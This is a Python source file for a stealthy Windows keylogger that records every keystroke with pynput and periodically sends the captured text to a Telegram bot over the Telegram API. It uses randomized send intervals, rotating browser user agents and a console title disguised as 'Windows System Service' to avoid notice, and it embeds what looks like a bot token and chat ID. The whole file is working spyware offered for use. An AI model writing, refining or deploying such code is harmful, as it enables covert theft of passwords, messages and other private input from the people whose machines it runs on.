import os
import requests
import threading
import time
from pynput import keyboard
import random

# === SECURE CONFIGURATION ===
BOT_TOKEN = os.environ.get('8346087012:AAGUFItHu3hRLJ4loxduUcteyJOoOzRrMkE')  # Use environment variables
CHAT_ID = os.environ.get('7192294390')

# === WINDOWS STEALTH SETTINGS ===
SEND_INTERVAL = random.randint(45, 75)  # Variable timing
MAX_BUFFER_SIZE = 500  # Limit buffer to avoid large transmissions

keystroke_buffer = ""

def obfuscate_send_to_telegram(message):
    """Obfuscated Telegram sending with random delays"""
    try:
        # Random delay before sending
        time.sleep(random.uniform(1, 5))
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": message}
        
        # Use different user agents
        headers = {
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0)',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0'
            ])
        }
        
        response = requests.post(url, data=data, headers=headers, timeout=10)
        return response.status_code == 200
    except:
        return False

def on_press(key):
    """Stealthy key press handler"""
    global keystroke_buffer
    
    try:
        # Handle normal characters
        if hasattr(key, 'char') and key.char is not None:
            keystroke_buffer += key.char
        else:
            # Minimal special key formatting
            special_keys = {
                keyboard.Key.space: ' ',
                keyboard.Key.enter: '\n',
                keyboard.Key.tab: '\t'
            }
            keystroke_buffer += special_keys.get(key, f'[{key.name}]')
        
        # Send if buffer gets too large
        if len(keystroke_buffer) >= MAX_BUFFER_SIZE:
            threading.Thread(target=obfuscate_send_to_telegram, 
                           args=(keystroke_buffer[:MAX_BUFFER_SIZE],)).start()
            keystroke_buffer = keystroke_buffer[MAX_BUFFER_SIZE:]
            
    except Exception:
        pass

def periodic_report():
    """Variable interval reporting"""
    global keystroke_buffer
    if keystroke_buffer:
        threading.Thread(target=obfuscate_send_to_telegram, 
                       args=(keystroke_buffer,)).start()
        keystroke_buffer = ""
    
    # Randomize next execution time
    next_interval = random.randint(30, 120)
    threading.Timer(next_interval, periodic_report).start()

# === WINDOWS-SPECIFIC STEALTH ===
def windows_stealth():
    """Windows-specific stealth techniques"""
    try:
        # Rename process (requires additional libraries)
        import ctypes
        ctypes.windll.kernel32.SetConsoleTitleW("Windows System Service")
    except:
        pass

if __name__ == "__main__":
    windows_stealth()
    periodic_report()
    
    with keyboard.Listener(on_press=on_press) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            pass

